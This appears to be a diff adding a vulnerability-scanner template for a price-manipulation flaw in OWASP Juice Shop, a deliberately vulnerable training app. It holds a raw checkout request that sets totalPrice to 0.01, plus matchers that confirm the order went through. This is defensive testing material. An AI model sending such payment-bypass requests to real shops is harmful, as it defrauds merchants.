@@ -1,0 +1,39 @@
+id: juice-shop-price-manipulation
+info:
+  name: Juice Shop Price Manipulation Business Logic Flaw
+  author: dast-mvp
+  description: Server accepts client-provided price values allowing payment bypass
+  severity: critical
+  tags:
+    - business-logic
+    - payment-bypass
+    - juice-shop
+    - owasp
+
+http:
+  - raw:
+      - |
+        POST /rest/basket/1/checkout HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{bearer_token}}
+        Content-Type: application/json
+
+        {"couponData": "bnVsbA==", "orderDetails": {"totalPrice": 0.01}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+      - type: word
+        words:
+          - "orderConfirmation"
+          - "confirmation"
+        condition: or
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "orderConfirmation"
